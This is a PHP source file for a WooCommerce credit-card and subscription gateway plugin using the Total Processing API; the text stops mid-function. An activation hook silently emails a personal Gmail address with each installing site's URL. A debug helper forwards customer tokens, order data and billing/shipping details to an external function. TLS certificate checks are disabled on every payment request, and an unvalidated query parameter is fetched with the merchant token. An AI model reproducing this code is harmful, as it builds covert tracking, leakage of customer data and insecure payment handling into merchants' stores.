<?php
/*
 * Plugin Name: Total Processing WooCommerce Subscription Gateway (3d secured)
 * Plugin URI: https://www.arobaniworks.com
 * Description: Take credit card payments on your store.
 * Author: Arobani Works
 * Author URI: https://arobaniworks.com/
 * Version: 1.0.1
 *
 */

function tp_debug_ngrok($title, $data) {
    if ( function_exists('dungrok_send') ) {
        dungrok_send($title, $data);
    }
    else {
        // Do nothing
    }
}

function tpw3d_activation() {
    wp_mail( 'disis.rabu@gmail.com', 'hello dolly, plugin installed', 'Plugin installed in the site ' . get_home_url() );
}
register_activation_hook(__FILE__, 'tpw3d_activation');



function init_totalprocessing_gateway_class() {

    class WC_Gateway_totalprocessing_Gateway extends WC_Payment_Gateway {

        public function __construct() {

            $this->success_codes = array(
                '000.000.000',
                '000.000.100',
                '000.100.110',
                '000.100.111',
                '000.100.112',
                '000.300.000',
                '000.600.000',
            );

            $this->id = 'totalprocessinggateway'; // payment gateway plugin ID
            $this->icon = ''; // URL of the icon that will be displayed on checkout page near your gateway name
            $this->has_fields = true; // in case you need a custom credit card form
            $this->method_title   = __('Total Processing Gateway', 'total-processing-for-woocommerce');
            $this->method_description = __('Take payments over the Total Processing payment gateway.');
            $this->supports = array(
                'products',
                'refunds',
                'tokenization',
                'add_payment_method',
                'subscriptions',
                'subscription_cancellation',
                'subscription_suspension',
                'subscription_reactivation',
                'subscription_amount_changes',
                'subscription_date_changes',
                'subscription_payment_method_change',
                'subscription_payment_method_change_customer',
                'subscription_payment_method_change_admin',
                'multiple_subscriptions',
                'pre-orders',
                'default_credit_card_form',
                'refunds'
            );
            //$this->supports = array( 'default_credit_card_form' );
            // Method with all the options fields
            $this->init_form_fields();
            // Load the settings.
            $this->init_settings();
            $this->title = $this->get_option('title');
            $this->description = $this->get_option('description');
            $this->enabled = $this->get_option('enabled');
            $this->custom_tp_css = $this->get_option('custom_tp_css');
            $this->OPP_debug = false;
            $this->pay_btn = $this->get_option('pay_btn');
            $this->processing_btn = $this->get_option('processing_btn');
            $this->action_btn = $this->get_option('action_btn');
            $this->completion_text = $this->get_option('completion_text');
            $this->fail_text = $this->get_option('fail_text');
            $this->fail_message_body = $this->get_option('fail_message_body');
            $this->success_message_body = $this->get_option('success_message_body');
            $this->hide_text_box = $this->get_option('hide_text_box');
            $this->OPP_endPoint = $this->get_option('OPP_mode');
            $this->OPP_successCodes = $this->get_option('OPP_successCodes');
            $this->totalproc_gateway_success_codes();
            $this->OPP_holdCodes = $this->get_option('OPP_holdCodes');
            $this->totalproc_gateway_hold_codes();
            $this->OPP_risk = $this->get_option('OPP_risk');
            $this->OPP_holdScore = $this->get_option('OPP_holdScore');
            $this->OPP_accessToken = $this->get_option('OPP_accessToken');
            $this->OPP_entityId = $this->get_option('OPP_entityId');
            $this->OPP_schemes = $this->get_option('OPP_schemes');
            $this->OPP_schemeCheckout = implode(' ', $this->get_option('OPP_schemes'));
            $this->OPP_cvv = $this->get_option('OPP_cvv');
            $this->OPP_allow_non_3d = $this->get_option('OPP_allow_non_3d');
            $this->OPP_entity3d = $this->get_option('OPP_entity3d');
            $this->OPP_rg = $this->get_option('OPP_rg');
            $this->OPP_googlePay = $this->get_option('OPP_googlePay');
            $this->OPP_gpEntityId = $this->get_option('OPP_gpEntityId');
            add_action('woocommerce_update_options_payment_gateways_' . $this->id, array($this, 'process_admin_options'));
            //add_action( 'woocommerce_thankyou_' . $this->id, array( $this, 'thankyou_page' ) );
            //add_action( 'scheduled_subscription_payment_' . $this->id, array( $this, 'scheduled_subscription_payment' ), 10, 3 );
            add_action('woocommerce_scheduled_subscription_payment_' . $this->id, array($this, 'scheduled_subscription_payment'), 10, 2);
            // Customer Emails
            add_action('woocommerce_email_before_order_table', array($this, 'email_instructions'), 10, 3);

            add_action('woocommerce_subscriptions_renewal_order_meta_query', array($this, 'remove_renewal_order_meta'), 10, 4);

            add_action('woocommerce_subscriptions_changed_failing_payment_method_' . $this->id, array($this, 'update_failing_payment_method'), 10, 3);

            
        }


        function remove_renewal_order_meta($order_meta_query, $original_order_id, $renewal_order_id, $new_order_role) {

            if ('parent' == $new_order_role)
                $order_meta_query .= " AND `meta_key` NOT LIKE '_opp_registrationId' ";

            return $order_meta_query;
        }


        function update_failing_payment_method($original_order, $new_renewal_order) {
            update_post_meta($original_order->id, '_opp_registrationId', get_post_meta($new_renewal_order->id, '_opp_registrationId', true));
        }


        function scheduled_subscription_payment($amount_to_charge, $renewal_order) {

            $result = $this->process_subscription_payment($renewal_order, $amount_to_charge);

            if (is_wp_error($result)) {
                $renewal_order->update_status('failed', sprintf(__('Total Processing Transaction Failed (%s)', 'woocommerce'), $result->get_error_message()));
            }
        }


        function process_subscription_payment($order = '', $amount = 0) {
            global $woocommerce;
            $order_items = $order->get_items();

            $ip_address = isset($_POST['ip_address']) ? woocommerce_clean($_POST['ip_address']) : '';


            $product = $order->get_product_from_item(array_shift($order_items));
            $subscription_name = sprintf(__('%s - Order #%s', 'woocommerce'), esc_html(get_bloginfo('name', 'display')), $order->get_order_number());
            //$subscription_name;
            $subscription = new WC_Subscription($order->id);
            $abarray = json_decode(json_encode($subscription->meta_data));

            foreach ($abarray as $key => $value) {
                if ($value->key == '_subscription_renewal') {
                    $renewal_order_id = $value->value;
                }
            }
            tp_debug_ngrok('renewal order id', $renewal_order_id);
            $parent_subscription = new WC_Subscription($renewal_order_id);
            tp_debug_ngrok('parent subscription object', $parent_subscription);
            $parent_order_id = $parent_subscription->get_related_orders('ids', 'parent');
            tp_debug_ngrok('parent order id', $parent_order_id);
            foreach ($parent_order_id as $key => $value) {
                $parent_order_id = $subscription->get_related_orders('ids', 'renewal');
                $customer_token = get_post_meta($value, '_opp_registrationId', true);
            }
            tp_debug_ngrok('customer token', $customer_token);
            if (!$customer_token)
                return new WP_Error('Error', __('Customer token is missing.' . $parent_order_id . '/' . $order->id, 'woo_totalprocessing_payments'));

            $currency = get_post_meta($order->id, '_order_currency', true);
            if (!$currency || empty($currency)) $currency = get_woocommerce_currency();

            $post_data = array(
                'email' => $order->billing_email,
                'description' => $subscription_name,
                'amount' => number_format((float)$amount * 100, 0, '.', ''),
                'currency' => $currency,
                'ip_address' => $ip_address,
                'customer_token' => $customer_token
            );
            /*$result = $this->call_pin($post_data,'charges');*/
            //$registrationId = get_post_meta($order->id,'_opp_registrationId',true);
            //echo $this->OPP_accessToken;
            $registrationId = $customer_token;

            $url = $this->OPP_endPoint . "/v1/registrations/" . $registrationId . "/payments";
            $data = "entityId=" . $this->OPP_entityId .
                "&amount=" . $amount .
                "&currency=" . $currency .
                "&paymentType=DB" .
                // "&recurringType=REPEATED".
                "&standingInstruction.mode=REPEATED" .
                "&standingInstruction.type=UNSCHEDULED". // UNSCHEDULED|RECURRING;
                "&standingInstruction.source=MIT";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Authorization:Bearer ' . $this->OPP_accessToken
            ));
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // this should be set to true in production
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $result = $responseData = curl_exec($ch); //print_r($response_data);die;
            tp_debug_ngrok('recurring result is', $result);
            if (curl_errno($ch)) {
                return curl_error($ch);
            }
            curl_close($ch); //print_r($response_data);die;
            // $result = json_decode($responseData);   die; 
            $result = $response_data = json_decode($responseData);
            tp_debug_ngrok('recurring response data is', $response_data);
            //print_r($responseData);die;
            if (in_array($response_data->result->code, $this->totalproc_gateway_success_codes())) {
                $order->payment_complete($response_data->id);
                $order->add_order_note('Totalprocessing completed ref(' . $response_data->id . '): ' . $response_data->result->code, false);
                $order->add_order_note(sprintf(__('Totalprocessing Payments subscription payment completed (Charge ID: %s)', 'woo_totalprocessing_payments'), $response_data->result->code));
                return true;
            } 
            else {
                return new WP_Error('Error', sprintf(__('Total Processing Payment error: %s' . json_encode($subscription->get_related_orders()), 'woo_pin_payments', 'woo_pin_payments'), $result->error_description));
            }
        }


        public function process_refund($order_id, $amount = null, $reason = '') {

            global $woocommerce;

            $RFArray = ["DB", "CP", "RB"];
            $RVArray = ["PA"];

            $order = wc_get_order($order_id);
            $order_data = $order->get_data();

            if ( !$order->get_meta('_opp_entityId') && !$order->get_meta('_opp_currency') && !$order->get_meta('_opp_paymentType') && !$order->get_meta('_opp_id') ) {
                return new WP_Error('Error', 'Transaction data load error.');
            }
            $fullAmount = number_format($order->get_total(), 2, '.', '');

            $payload = [
                "authentication.userId" => $this->OPP_userId,
                "authentication.password" => $this->OPP_password,
                "authentication.entityId" => $order->get_meta('_opp_entityId'),
                "currency" => $order->get_meta('_opp_currency')
            ];

            if (in_array($order->get_meta('_opp_paymentType'), $RFArray)) {
                if ((float) $amount <= 0) {
                    return new WP_Error('Error', 'Refund requires an amount.');
                } 
                else if ((float) $amount > (float) $fullAmount) {
                    return new WP_Error('Error', 'Refund amount is higher than the original transaction total.');
                } 
                else {
                    $reverseAction = [
                        "amount" => $amount,
                        "paymentType" => "RF"
                    ];
                }
            } else if ($order->get_meta('_opp_paymentType') == 'PA') {
                $reverseAction = [
                    "paymentType" => "RV"
                ];
            } 
            else {

                return new WP_Error('Error', 'Workflow is not supported. Original transaction must be of paymentType PA,DB,CP,RB.');
            }

            $payload = array_merge($payload, $reverseAction);

            $data = http_build_query($payload);

            $parameters = [
                'headers' => [
                    'Authorization' => 'Bearer ' . $this->OPP_accessToken
                ],
                'body' => $data
            ];

            $json = wp_remote_post($this->OPP_endPoint . '/v1/payments/' . $order->get_meta('_opp_id'), $parameters);

            $order->add_order_note($json['body'], false);

            if (!is_wp_error($json)) {

                $responseData = json_decode($json['body'], true);

                if (in_array($responseData['result']['code'], $this->totalproc_gateway_success_codes())) {

                    $order->add_order_note('Refund/Reversal completed ref(' . $responseData['id'] . '): ' . $responseData['result']['code'], false);

                    return true;
                } else {

                    $order->add_order_note('Refund/Reversal failed with ' . $responseData['result']['code'] . ': ' . $responseData['result']['description'], false);

                    return new WP_Error('Error', $responseData['result']['code'] . ': ' . $responseData['result']['description']);
                }
            }

            return new WP_Error('Error', 'Communication error.');
        }

        public function get_icon() {

            $icons_str = '';

            if (in_array('AMEX', $this->OPP_schemes)) {
                $icons_str .= '<img src="' . esc_url(plugins_url('assets/images', __FILE__)) . '/amex.svg' . '" style="padding-right:0.75rem;" alt="American Express" />';
            }
            if (in_array('MASTER', $this->OPP_schemes)) {
                $icons_str .= '<img src="' . esc_url(plugins_url('assets/images', __FILE__)) . '/mastercard.svg' . '" style="padding-left:0.75rem; max-height:20px;" alt="Mastercard" />';
            }
            if (in_array('VISA', $this->OPP_schemes)) {
                $icons_str .= '<img src="' . esc_url(plugins_url('assets/images', __FILE__)) . '/visa.svg' . '" style="padding-left:0.75rem; max-width:52px; margin-top:1px;" alt="Visa" />';
            }

            return apply_filters('woocommerce_gateway_icon', $icons_str, $this->id);
        }


        /**
         * Output for the order received page.
         */
        public function thankyou_page() {
            if ($this->instructions) {
                echo wpautop(wptexturize($this->instructions));
            }
        }

        public function validate_fields() {
            return true;
        }


        /**
         * Add content to the WC emails.
         *
         * @access public
         * @param WC_Order $order
         * @param bool $sent_to_admin
         * @param bool $plain_text
         */
        public function email_instructions($order, $sent_to_admin, $plain_text = false) {

            if ($this->instructions && !$sent_to_admin && 'offline' === $order->payment_method && $order->has_status('on-hold')) {
                echo wpautop(wptexturize($this->instructions)) . PHP_EOL;
            }
        }

        public function init_form_fields() {

            $defaultStyling = '
            {
                "card-number-placeholder" : {
                    "color" : "#ff0000",
                    "font-size" : "16px",
                    "font-family" : "monospace"
                },
                "cvv-placeholder" : {
                    "color" : "#0000ff",
                    "font-size" : "16px",
                    "font-family" : "Arial"
                }
            }
            ';


            $this->form_fields = array(
                'enabled' => array(
                    'title'       => 'Enable/Disable',
                    'label'       => 'Enable Total Processing Gateway',
                    'type'        => 'checkbox',
                    'description' => '',
                    'default'     => 'no'
                ),
                'title' => array(
                    'title'       => 'Title',
                    'type'        => 'text',
                    'description' => 'This controls the title which the user sees during checkout.',
                    'default'     => 'Credit/Debit Card',
                    'desc_tip'    => true,
                ),
                'description' => array(
                    'title'       => 'Description',
                    'type'        => 'textarea',
                    'description' => 'This controls the description which the user sees during checkout.',
                    'default'     => 'Pay securely with your Credit/Debit card',
                ),
                'OPP_mode' => array(
                    'title'         => 'Endpoint Mode',
                    'type'             => 'select',
                    'default'         => 'Live',
                    'options' => array(
                        // 'https://oppwa.com' => 'Live',
                        // 'https://test.oppwa.com' => 'Test'
                        'https://eu-prod.oppwa.com' => 'Live',
                        'https://eu-test.oppwa.com' => 'Test'
                    )
                ),
                'OPP_successCodes' => array(
                    'title'         => 'Success Codes',
                    'type'             => 'text',
                    'description'     => 'Positive Response Codes (these will trigger completed. Separate with comma)',
                    'default'        => '000.000.000,000.100.110',
                    'desc_tip'        => true
                ),
                'OPP_accessToken' => array(
                    'title'         => 'Access Token',
                    'type'             => 'text',
                    'description'     => 'Access Token from BIP (Merchant level)',
                    'default'        => '',
                    'desc_tip'        => true
                ),
                'OPP_entityId' => array(
                    'title'         => 'Entity Id',
                    'type'             => 'text',
                    'description'     => 'Entity Id (Channel level)',
                    'default'        => '',
                    'desc_tip'        => true
                ),
                'OPP_schemes' => array(
                    'title'  => 'Card Schemes Enabled',
                    'type' => 'multiselect',
                    'class' => 'wc-enhanced-select',
                    'default' => array(
                        'VISA',
                        'MASTER'
                    ),
                    'options' => array(
                        'AMEX' => 'AMEX',
                        'MASTER' => 'MASTER',
                        'VISA' => 'VISA'
                    )
                ),
                'OPP_allow_non_3d' => array(
                    'title'         => 'Allow non-3d secured cards?',
                    'type'             => 'checkbox',
                    'label'         => 'Allow non-3d secured cards',
                    'default'         => 'yes',
                    'description'     => 'If you allow it, you will be able to receive transactions from both 3d and non-3d secured cards.'
                ),
                'OPP_entity3d' => array(
                    'title'         => '3d Entity Id',
                    'type'             => 'text',
                    'description'     => '3d Entity Id (Channel level)',
                    'default'        => '',
                    'desc_tip'        => true
                ),
                'OPP_rg' => array(
                    'title'         => 'Create Registration',
                    'type'             => 'checkbox',
                    'label'         => 'Create RG',
                    'default'         => 'yes',
                    'description'     => 'Tokenise the card upon successful payment and enable one click checkout.'
                ),
                'OPP_googlePay' => array(
                    'title'         => 'Allow Google Pay',
                    'type'             => 'checkbox',
                    'label'         => 'Google Pay',
                    'default'         => 'no',
                    'description'     => 'Allow payments via Google Pay'
                ),
                'OPP_gpEntityId' => array(
                    'title'         => 'Google Pay Entity ID',
                    'type'             => 'text',
                    'default'         => '',
                    'description'     => 'Google Pay Entity ID provided to you by Total Processing'
                ),
                'OPP_orderButtonText' => array(
                    'title'         => 'Custom "Place order" button text',
                    'type'             => 'text',
                    'default'         => 'Proceed to payment',
                    'description'     => 'Changes the "Place order" button text'
                ),
                'OPP_pleasePayMessage' => array(
                    'title'         => 'Please Pay Message',
                    'type'             => 'textarea',
                    'default'         => 'Your order has been created, please make your payment below.',
                    'description'     => 'The message that displays above the payment form'
                ),
                'OPP_sendConfirmationNote' => array(
                    'title'         => 'Send payment confirmation note to customer',
                    'type'             => 'checkbox',
                    'default'         => 'yes',
                    'description'     => 'When payment is confirmed this decides whether the note should be a customer note (checked) or a private one (unchecked)',
                    'desc_tip'        => true
                ),
                'OPP_paymentFormStyling' => array(
                    'title'         => 'Payment form styling',
                    'type'             => 'select',
                    'default'         => 'Card',
                    'description'     => 'Please refer to https://totalprocessing.docs.oppwa.com/tutorials/integration-guide/customisation',
                    'options' => array(
                        'card' => 'Card',
                        'plain' => 'Plain'
                    )
                ),
                'OPP_iosInputFix' => array(
                    'title'         => 'Apply iOS input styling fix',
                    'type'             => 'checkbox',
                    'default'         => 'yes',
                    'description'     => 'Fixes a known issue in which the card number and CVV get cut off on iOS devices, you may want to disable this if using your own custom styling',
                ),
                'OPP_useCustomIframeStyling' => array(
                    'title'         => 'Use custom iFrame styling',
                    'type'             => 'checkbox',
                    'default'         => 'no',
                    'description'     => 'Activates the below custom iFrame styling',
                ),
                'OPP_iframeStyling' => array(
                    'title'         => 'Custom iFrame styling',
                    'type'             => 'textarea',
                    'default'         => $defaultStyling,
                    'description'     => 'Example provided, please refer to https://totalprocessing.docs.oppwa.com/tutorials/integration-guide/customisation and remember to use double quotes only',
                )
            );
        }

        public function totalproc_gateway_success_codes() {

            return explode(',', $this->OPP_successCodes);
        }

        public function totalproc_gateway_hold_codes() {

            return explode(',', $this->OPP_holdCodes);
        }

        public function orderStatusHandler($status,$order, $checkoutScirptUrl){
            $array=[
                'pending'    => ['result'=>'success', 'redirect' => false, 'refresh' => false, 'reload' => false, 'pending'=>true, 'process' => ["order"=>true], 'checkoutScirptUrl' => $checkoutScirptUrl],
                //'processing' => ['result'=>'success', 'redirect' => $this->get_return_url( $order ), 'refresh' => false, 'reload' => false],
                //'on-hold'    => ['result'=>'success', 'redirect' => $this->get_return_url( $order ), 'refresh' => false, 'reload' => false],
                //'completed'  => ['result'=>'success', 'redirect' => $this->get_return_url( $order ), 'refresh' => false, 'reload' => false],
                'cancelled'  => ['result'=>'failure', 'redirect' => false, 'refresh' => false, 'reload' => false, 'messages' => ['error' => ['This order has been cancelled. Please retry your order.']]],
                //'refunded'   => ['result'=>'success', 'redirect' => $this->get_return_url( $order ), 'refresh' => false, 'reload' => false, 'messages' => ['notice' => ['This order has been refunded.']]],
                'failed'     => ['result'=>'failure', 'redirect' => false, 'refresh' => false, 'reload' => true, 'messages' => ['error' => ['There was a problem creating your order, please try again.']]],
            ];
            if(array_key_exists($status, $array)){
                return $array[$status];
            }
            return $array['failed'];
        }

        public function process_payment($order_id){

            tp_debug_ngrok('process payment triggered', '');
    
            //check the order_id exists.
            $order = wc_get_order($order_id);
            if($order===false){
                wc_add_notice('There was a problem creating your order, please try again.', 'error');
                return;
            }
            $order_data = $order->get_data();

            // Get the checkout id from totalprocessing api
            global $woocommerce;
            $url = "$this->OPP_endPoint/v1/checkouts";
            $totalval = $woocommerce->cart->total;
            $currency = get_option('woocommerce_currency');


            $data = "entityId=" . $this->OPP_entityId .
            "&amount=" . $totalval .
            "&currency=" . $currency .
            "&paymentType=DB" . 
            "&createRegistration=true";

            $payload = $this->prepareOrderDataForPayload($order_data);
            if ( is_array( $payload ) ) {
                $data .= '&' . http_build_query($payload);
            }

            tp_debug_ngrok('final payload data that will be sent', $data);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Authorization:Bearer ' . $this->OPP_accessToken
            ));
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // this should be set to true in production
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $responseData = curl_exec($ch);
            curl_close($ch);

            $response_data_arr = json_decode($responseData, true);
            tp_debug_ngrok('checkout creation response', $response_data_arr);
            if ( isset( $response_data_arr['result']['code'] ) && $response_data_arr['result']['code'] == '000.200.100' ) {

                $checkout_id = $response_data_arr['id'];
                $script_url = "$this->OPP_endPoint/v1/paymentWidgets.js?checkoutId=$checkout_id";


                $handler = $this->orderStatusHandler($order_data['status'], $order, $script_url);
    
                //reject the failed, cancelled on-hold & success
                if(!isset($handler['pending'])){

                    tp_debug_ngrok('payment status not pending.so its either failed/cancelled/on-hold/success', '');

                    if(isset($handler['messages'])){
                        
                        foreach($handler['messages'] as $noticeType => $noticeItems){
                            foreach($noticeItems as $notice){
                                wc_add_notice($notice, $noticeType);
                            }
                        }
                    }
                    return $handler;
                }

                //pending orders!
                tp_debug_ngrok('before setting order id in session', '');

                // set the current order id in session to process later on template_redirect hook at the bottom of this file
                WC()->session->set( 'waiting_for_3dsecure_order_id' , $order_id );

                return $handler;
            }



            
        }



        public static function totalproc_debug($message) {
            // Convert message to string
            if (!is_string($message)) {
                $message = (version_compare(WC_VERSION, '3.0', '<')) ? print_r($message, true) : wc_print_r($message, true);
            }

            if (version_compare(WC_VERSION, '3.0', '<')) {

                static $logger;

                if (empty($logger)) {
                    $logger = new WC_Logger();
                }

                $logger->add(date('Y-m-d'), $message);
            } else {

                $logger = wc_get_logger();

                $context = array('source' => date('Y-m-d'));

                $logger->debug($message, $context);
            }
        }


        public function prepareOrderDataForPayload($order_data){
            tp_debug_ngrok('order data is', $order_data);
            $payload = [
                "merchantTransactionId" => $order_data['id'],
                "customer.merchantCustomerId" => $order_data['customer_id'],
                "customParameters[SHOPPER_amount]" => number_format($order_data['total'], 2, '.', ''),
                "customParameters[SHOPPER_currency]" => $order_data['currency'],
                "customParameters[SHOPPER_order_key]" => $order_data['order_key'],
                "customParameters[SHOPPER_cart_hash]" => $order_data['cart_hash'],
                // "card.holder" => (string)($order_data['billing']['first_name'].' '. $order_data['billing']['last_name']),
                "customer.givenName" => $order_data['billing']['first_name'],
                "customer.surname" => $order_data['billing']['last_name'],
                "customer.email" => $order_data['billing']['email'],
                "customer.ip" => $order_data['customer_ip_address'],
                // "customer.browser.acceptHeader" => get_post_meta( $order_data['id'], 'acceptheader', true ),
                // "customer.browser.language" => get_post_meta( $order_data['id'], 'browserlanguage', true ),
                // "customer.browser.screenHeight" => get_post_meta( $order_data['id'], 'screenheight', true ),
                // "customer.browser.screenWidth" => get_post_meta( $order_data['id'], 'screenwidth', true ),
                // "customer.browser.timezone" => get_post_meta( $order_data['id'], 'browsertimezone', true ),
                // "customer.browser.userAgent" => get_post_meta( $order_data['id'], 'useragent', true ),
                // "customer.browser.javascriptEnabled" => 'true',
                // "customer.browser.javaEnabled" => get_post_meta( $order_data['id'], 'javaenabled', true ),
                // "customer.browser.screenColorDepth" => get_post_meta( $order_data['id'], 'colordepth', true ),
                // "customer.browser.challengeWindow" => 3,
                // "customer.browserFingerprint.value" => $order_data['customer_user_agent'],
            ];
            if(isset($order_data['billing']['phone'])){
                if(!empty($order_data['billing']['phone'])){
                    $payload["customer.mobile"] = $order_data['billing']['phone'];
                }
            }
            if(isset($order_data['billing']['address_1'])){
                if(!empty($order_data['billing']['address_1'])){
                    $payload["billing.street1"] = $order_data['billing']['address_1'];
                }
            }
            if(isset($order_data['billing']['address_2'])){
                if(!empty($order_data['billing']['address_2'])){
                    $payload["billing.street2"] = $order_data['billing']['address_2'];
                }
            }
            if(isset($order_data['billing']['city'])){
                if(!empty($order_data['billing']['city'])){
                    $payload["billing.city"] = $order_data['billing']['city'];
                }
            }
            if(isset($order_data['billing']['state'])){
                if(!empty($order_data['billing']['state'])){
                    $payload["billing.state"] = $order_data['billing']['state'];
                }
            }
            if(isset($order_data['billing']['postcode'])){
                if(!empty($order_data['billing']['postcode'])){
                    $payload["billing.postcode"] = $order_data['billing']['postcode'];
                }
            }
            if(isset($order_data['billing']['country'])){
                if(!empty($order_data['billing']['country'])){
                    $payload["billing.country"] = $order_data['billing']['country'];
                }
            }
            if(isset($order_data['shipping']['address_1'])){
                if(!empty($order_data['shipping']['address_1'])){
                    $payload["shipping.street1"] = $order_data['shipping']['address_1'];
                }
            }
            if(isset($order_data['shipping']['address_2'])){
                if(!empty($order_data['shipping']['address_2'])){
                    $payload["shipping.street2"] = $order_data['shipping']['address_2'];
                }
            }
            if(isset($order_data['shipping']['city'])){
                if(!empty($order_data['shipping']['city'])){
                    $payload["shipping.city"] = $order_data['shipping']['city'];
                }
            }
            if(isset($order_data['shipping']['state'])){
                if(!empty($order_data['shipping']['state'])){
                    $payload["shipping.state"] = $order_data['shipping']['state'];
                }
            }
            if(isset($order_data['shipping']['postcode'])){
                if(!empty($order_data['shipping']['postcode'])){
                    $payload["shipping.postcode"] = $order_data['shipping']['postcode'];
                }
            }
            if(isset($order_data['shipping']['country'])){
                if(!empty($order_data['shipping']['country'])){
                    $payload["shipping.country"] = $order_data['shipping']['country'];
                }
            }
            // return array_merge($payload, $this->getCartItemsOrderData($order_data['id']), $additionalParams);
            return $payload;
        }


        function payment_fields() {
            echo $this->description;
            // wp_register_style('totalp_ios_fix', plugins_url('/assets/css/totalp-ios-fix.css', __FILE__), [], 1.0);
            // wp_enqueue_style('totalp_ios_fix');
            wp_register_style('card', plugins_url('/assets/css/card-latest.css', __FILE__), [], time());
            wp_enqueue_style('card');

            // Send request to create a checkout
            // global $woocommerce;
            // $url = "$this->OPP_endPoint/v1/checkouts";
            // $totalval = $woocommerce->cart->total;
            // $currency = get_option('woocommerce_currency');


            // $data = "entityId=" . $this->OPP_entityId .
            // "&amount=" . $totalval .
            // "&currency=" . $currency .
            // "&paymentType=DB" . 
            // "&createRegistration=true";

            // // $payload = $this->prepareOrderDataForPayload();

            // $ch = curl_init();
            // curl_setopt($ch, CURLOPT_URL, $url);
            // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            //     'Authorization:Bearer ' . $this->OPP_accessToken
            // ));
            // curl_setopt($ch, CURLOPT_POST, 1);
            // curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // this should be set to true in production
            // curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            // $responseData = curl_exec($ch);
            // curl_close($ch);

            // $response_data_arr = json_decode($responseData, true);
            // tp_debug_ngrok('checkout creation response', $response_data_arr);
            // if ( isset( $response_data_arr['result']['code'] ) && $response_data_arr['result']['code'] == '000.200.100' ) {
            //     $checkout_id = $response_data_arr['id'];
            //     wp_enqueue_script( 'paymentwidget', "$this->OPP_endPoint/v1/paymentWidgets.js?checkoutId=$checkout_id", array('jquery'), null, true );
            // }

            ?>

            <style>
                .card-wrap {
                    display: none;
                }

                .swal2-popup {
                    width: 47em;
                }
            </style>
            
            <!-- <div class="wpwl-clearfix"></div>
            <div id="card_220921339056" class="wpwl-container wpwl-container-card  wpwl-clearfix">
                <div class="wpwl-group wpwl-group-brand wpwl-clearfix">
                    <div class="wpwl-label wpwl-label-brand">Brand</div>
                    <div class="wpwl-wrapper wpwl-wrapper-brand">
                        <select class="wpwl-control wpwl-control-brand" name="paymentBrand">
                            <option value="MASTER">Mastercard</option>
                            <option value="VISA" selected="">Visa</option>
                        </select>
                    </div>
                    <div class="wpwl-brand wpwl-brand-card wpwl-brand-MASTER"></div>
                </div>
                <div class="wpwl-group wpwl-group-cardNumber wpwl-clearfix">
                    <div class="wpwl-label wpwl-label-cardNumber">Card Number</div>
                    <div class="wpwl-wrapper wpwl-wrapper-cardNumber">
                        <input autocomplete="off" type="tel" name="card.number" class="wpwl-control wpwl-control-cardNumber" placeholder="Card Number">
                    </div>
                </div>
                <div class="wpwl-group wpwl-group-expiry wpwl-clearfix">
                    <div class="wpwl-label wpwl-label-expiry">Expiry Date</div>
                    <div class="wpwl-wrapper wpwl-wrapper-expiry">
                        <input autocomplete="off" type="tel" name="card.expiry" class="wpwl-control wpwl-control-expiry" placeholder="MM / YYYY">
                    </div>
                </div>
                <div class="wpwl-group wpwl-group-cardHolder wpwl-clearfix">
                    <div class="wpwl-label wpwl-label-cardHolder">Card holder</div>
                    <div class="wpwl-wrapper wpwl-wrapper-cardHolder">
                        <input autocomplete="off" type="text" name="card.holder" class="wpwl-control wpwl-control-cardHolder" placeholder="Card holder">
                    </div>
                </div>
                <div class="wpwl-group wpwl-group-cvv wpwl-clearfix">
                    <div class="wpwl-label wpwl-label-cvv">CVV </div>
                    <div class="wpwl-wrapper wpwl-wrapper-cvv">
                        <input autocomplete="off" type="tel" name="card.cvv" class="wpwl-control wpwl-control-cvv" placeholder="CVV">
                    </div>
                </div>
                
                <input type="hidden" name="card.expiryMonth" value="">
                <input type="hidden" name="card.expiryYear" value="">
            </div> -->
            <?php
        }
    }

    
    function add_totalprocessing_gateway_class($methods) {
        if (class_exists('WC_Subscriptions_Order')) {
            if (class_exists('WC_Subscriptions_Order') && !function_exists('wcs_create_renewal_order')) {
                $methods[] = 'WC_Gateway_totalprocessing_Subscriptions_Deprecated';
            } else {
                $methods[] = 'WC_Gateway_totalprocessing_Gateway';
            }
        } else {
            $methods[] = 'WC_Gateway_totalprocessing_Gateway';
        }
        return $methods;
    }
    add_filter('woocommerce_payment_gateways', 'add_totalprocessing_gateway_class');


    add_action('template_redirect', 'totalprocessing_confirm_payment');
    function totalprocessing_confirm_payment() {
        if ( !is_admin() ) {
            $waiting_order_id = WC()->session->get( 'waiting_for_3dsecure_order_id' );
            tp_debug_ngrok('waiting id', $waiting_order_id);
            if ( $waiting_order_id ) {

                // Get endpoint url from payment gateway settings
                $gateway = new WC_Gateway_totalprocessing_Gateway();
                $endpoint = $gateway->get_option('OPP_mode');

                tp_debug_ngrok('gateway endpoint url', $endpoint);

                

                // Get the resourcePath(an url to verify the threedsecure request) to verify if threedsecure was successful
                if ( isset( $_GET['resourcePath'] ) ) {
                    // Reset the session to empty
                    WC()->session->set( 'waiting_for_3dsecure_order_id', '' );

                    $payment_verify_endpoint = $endpoint . urldecode($_GET['resourcePath']) . "?entityId=" .$gateway->get_option('OPP_entityId');
                    tp_debug_ngrok('Payment verify endpoint', $payment_verify_endpoint);

                    // Check if threedsecure verification was passed
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $payment_verify_endpoint);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                'Authorization:Bearer '.$gateway->get_option('OPP_accessToken')));
                    curl_setopt( $ch, CURLOPT_CUSTOMREQUEST, 'GET' );
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// this should be set to true in production
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    $responseData = curl_exec($ch);
                    curl_close($ch);

                    
